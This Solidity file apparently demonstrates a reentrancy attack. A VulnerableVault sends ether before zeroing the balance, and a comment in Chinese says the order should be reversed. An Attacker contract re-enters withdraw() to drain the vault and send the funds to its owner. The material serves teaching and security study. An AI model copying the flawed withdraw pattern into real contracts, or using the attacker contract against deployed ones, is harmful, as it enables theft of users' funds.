// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract VulnerableVault {
    mapping(address => uint) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() external view returns (uint) {
        return balances[msg.sender];
    }

    function withdraw() external {
        uint balance = balances[msg.sender];

        require(balance > 0, "no balance");

        (bool success, ) = payable(msg.sender).call{value: balance}("");

        require(success, "withdraw failed");

        balances[msg.sender] = 0; // 这段代码应该放到取之前 才可以防止重入问题
    }
}

contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
        // 方式1: 攻击完毕后直接提取到当前账户
        payable(msg.sender).transfer(address(this).balance);
    }
}
